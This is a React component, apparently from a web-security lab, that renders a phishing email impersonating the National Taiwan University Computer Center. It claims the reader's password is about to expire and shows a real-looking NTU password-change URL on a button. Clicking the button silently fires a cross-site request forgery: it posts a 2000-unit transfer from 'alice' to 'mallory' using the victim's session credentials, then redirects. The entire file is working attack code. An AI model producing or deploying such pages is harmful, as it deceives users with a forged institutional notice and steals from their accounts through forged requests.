import axios from "axios";
import { getUrl } from "./utils";
import "./my_mail.css";

const MyMail = () => {
    const handleUpdatePassword = () => {
        const url = getUrl(`/transfer?src_account_id=alice&dst_account_id=mallory&amount=2000"`);
        axios.post(url, {}, { withCredentials: true })
            .then(() => {
                console.log("transfer success");
            })
            .catch((err) => {
                console.log("transfer error");
                console.error(err);
            });

        window.location.href = "http://localhost:3001";
    };

    return (
        <div>
            <h1>Important: Your Password Will Expire in One Day</h1>
            <h3>National Taiwan University</h3>
            <div>Dear student,</div>
            <div>This email is meant to inform you that your password will expire in one day.</div>
            <div>Please follow the link below to update your password</div>
            <button
                className="my-mail-update-password"
                onClick={handleUpdatePassword}
            >
                https://changepassword.cc.ntu.edu.tw
            </button><br/>
            <br/>
            <div>Best,</div>
            <div>NTU Computer Center</div>
        </div>
    );
};

export default MyMail;
